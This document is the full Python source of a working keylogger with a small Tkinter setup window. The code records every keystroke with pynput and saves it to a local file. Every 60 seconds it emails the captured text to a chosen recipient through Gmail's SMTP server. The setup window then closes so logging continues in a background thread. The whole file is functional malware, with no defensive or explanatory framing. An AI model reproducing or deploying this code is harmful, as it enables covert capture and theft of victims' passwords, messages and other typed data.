import smtplib
import time
import threading
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from tkinter import Tk, Label, Entry, Button, messagebox, StringVar

# Configuration
LOG_FILE = "keylog.txt"  # File to store keystrokes
INTERVAL = 60  # Time interval (in seconds) to send logs
STOP_HOTKEY = {keyboard.Key.shift, keyboard.Key.ctrl, keyboard.KeyCode.from_char('s')}  # Stop key combination

# Keylogger class
class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.stop_event = threading.Event()
        self.hotkey_pressed = set()

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]
            else:
                self.log += f" [{key}] "

        # Check for stop hotkey
        if key in STOP_HOTKEY:
            self.hotkey_pressed.add(key)
            if self.hotkey_pressed == STOP_HOTKEY:
                self.stop_event.set()

    def on_release(self, key):
        if key in self.hotkey_pressed:
            self.hotkey_pressed.remove(key)

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()

    def save_log(self):
        with open(LOG_FILE, "a") as f:
            f.write(self.log)
        self.log = ""

# Email sender function
def send_email(sender_email, sender_password, recipient_email, subject, body):
    try:
        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = recipient_email
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain"))

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to periodically send logs
def monitor_and_send_logs(sender_email, sender_password, recipient_email, time_limit):
    keylogger = Keylogger()
    keylogger.start()

    start_time = time.time()  # Record the start time

    while not keylogger.stop_event.is_set():
        # Check if the time limit has been reached
        if time.time() - start_time >= time_limit:
            print("Time limit reached. Stopping keylogger...")
            break

        # Save logs and send email every INTERVAL seconds
        keylogger.save_log()
        with open(LOG_FILE, "r") as f:
            log_content = f.read()
        if log_content:
            send_email(sender_email, sender_password, recipient_email, "Keylogger Report", log_content)
            open(LOG_FILE, "w").close()  # Clear the log file after sending

        time.sleep(INTERVAL)

    keylogger.stop()
    print("Keylogger stopped.")

# GUI Application
class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger with GUI")
        self.root.geometry("400x300")

        # Variables
        self.sender_email = StringVar()
        self.sender_password = StringVar()
        self.recipient_email = StringVar()
        self.time_limit = StringVar()

        # Labels and Entries
        Label(root, text="Sender Email:").pack(pady=5)
        Entry(root, textvariable=self.sender_email, width=40).pack(pady=5)

        Label(root, text="Sender Password:").pack(pady=5)
        Entry(root, textvariable=self.sender_password, width=40, show="*").pack(pady=5)

        Label(root, text="Recipient Email:").pack(pady=5)
        Entry(root, textvariable=self.recipient_email, width=40).pack(pady=5)

        Label(root, text="Time Limit (seconds):").pack(pady=5)
        Entry(root, textvariable=self.time_limit, width=40).pack(pady=5)

        # Buttons
        Button(root, text="Start Keylogger", command=self.start_keylogger).pack(pady=10)

    def start_keylogger(self):
        sender_email = self.sender_email.get()
        sender_password = self.sender_password.get()
        recipient_email = self.recipient_email.get()
        time_limit = int(self.time_limit.get())

        if not sender_email or not sender_password or not recipient_email or not time_limit:
            messagebox.showerror("Error", "Please fill in all fields.")
            return

        # Close the GUI
        self.root.destroy()

        # Start the keylogger in a separate thread
        keylogger_thread = threading.Thread(
            target=monitor_and_send_logs,
            args=(sender_email, sender_password, recipient_email, time_limit),
        )
        keylogger_thread.start()

        print("Keylogger started. Press Ctrl+Shift+S to stop manually.")

# Main function
if __name__ == "__main__":
    root = Tk()
    app = KeyloggerApp(root)
    root.mainloop()
